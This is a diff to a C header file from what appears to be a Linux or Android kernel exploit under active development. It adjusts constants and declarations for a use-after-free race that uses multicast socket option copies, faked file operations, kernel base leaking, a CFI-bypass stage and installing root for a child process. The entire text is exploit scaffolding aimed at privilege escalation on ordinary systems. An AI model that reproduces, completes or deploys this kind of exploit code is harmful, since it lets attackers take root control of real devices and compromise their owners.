@@ -68,12 +68,6 @@ extern int g_core_consumer;
 
 #define FAKE_TASK_PRIO 120
 #define FAKE_WAITER_PRIO 140
-#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
-#define FAKE_TASK_UCLAMP_OFF 0x358
-#define FAKE_UCLAMP_ACTIVE_BIT 16
-#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
-#define FAKE_UCLAMP_MAX_ACTIVE \
-  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
 
@@ -157,6 +151,15 @@ extern int g_core_consumer;
 #define PSELECT_TIMEOUT_USEC 200000
 #define MCAST_ROUTE_OPTNAME 46
 #define MCAST_ROUTE_COPY_LEN 0x108
+/* mcast window: re-copy the 264B optval until the consumer finishes its
+ * punch, then close immediately. 0 = old model (single copy + fixed
+ * userspace busy-wait), kept for regression comparison. */
+#define MCAST_REFRESH_WINDOW 1
+#define MCAST_WINDOW_TIMEOUT_MSEC 3000
+/* Open the mcast socket before the UAF is created so no deep syscall
+ * after the dangling waiter is set up overwrites the waiter stack. */
+extern int mcast_sock;
+int mcast_open_socket(void);
 #define SLIDE_PSELECT_TIMEOUT_SEC 1
 #define SLIDE_WAIT_SECONDS 2
 #define PSELECT_WRITE_SHAPE_DEFAULT 1
@@ -489,6 +492,8 @@ int leak_kernel_base(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
+int mcast_install_fake_fops(void);
+int mcast_restore_misc_fops(int fd);
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
